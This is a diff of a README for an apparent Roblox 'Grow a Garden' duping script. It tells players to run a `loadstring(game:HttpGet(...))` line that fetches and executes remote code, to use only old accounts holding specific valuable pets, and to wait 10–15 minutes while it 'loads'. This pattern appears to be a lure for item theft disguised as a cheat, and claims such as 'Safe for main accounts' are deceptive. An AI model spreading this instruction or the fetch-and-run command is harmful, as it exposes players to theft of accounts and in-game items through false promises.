@@ -2,7 +2,7 @@ GROW A GARDEN SCRIPT 🌱
 ✅ Works on any executor
 ✅ Safe for main accounts
 ✅ Lets you trade and gift duper items! 🤫
-❗ Only works on old accounts with high value pets and fruits
+❗ Only works on old accounts with high value pets and fruits, Alt Accounts Are Detected as SPAM
 
 
 📜 How to Use:
@@ -17,7 +17,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/LATESTSCRIPTGAG/GROWA
 3. Join a public server.
 
 
-4. Execute Wait 5–10 minutes for everything to load properly.
+4. Execute Wait 10-15 minutes for everything to load properly.
 
 
 5. Done — enjoy!
@@ -25,7 +25,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/LATESTSCRIPTGAG/GROWA
 
 ⚠️ Note:
 🔥This script won’t work on new accounts.🔥
-‼️You need valuable pets and fruits for it to function, if none detection. will stop at 100%‼️
+‼️Make Sure to Have Raccoon, Dragonfly, Queen Bee, or Fox in your Inventory, if not then it won't work and be stuck at 100%
 ⭕Be patient — the script takes a 5-10 minutes to fully load!⭕
 
 
